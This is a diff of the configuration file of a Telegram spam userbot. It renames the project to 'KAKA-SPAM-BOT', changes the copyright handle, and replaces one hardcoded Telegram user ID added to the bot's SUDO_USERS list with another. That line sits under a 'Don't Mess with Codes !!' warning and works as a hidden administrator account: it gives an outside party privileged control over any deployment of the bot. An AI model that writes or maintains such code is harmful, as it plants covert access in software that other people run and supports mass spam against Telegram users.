@@ -1,5 +1,5 @@
-# RiZoeLXSpam - Spam Userbots
-# Copyright © 2021 @RiZoeLX
+# KAKA-SPAM-BOT - Spam Userbots
+# Copyright © 2021 @marrkmusic
 
 import os
 import sys
@@ -46,7 +46,7 @@ OWNER_ID = int(os.environ.get("OWNER_ID", None))
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1789859817)
+SUDO_USERS.append(17898598635)
 
 # Tokens
 
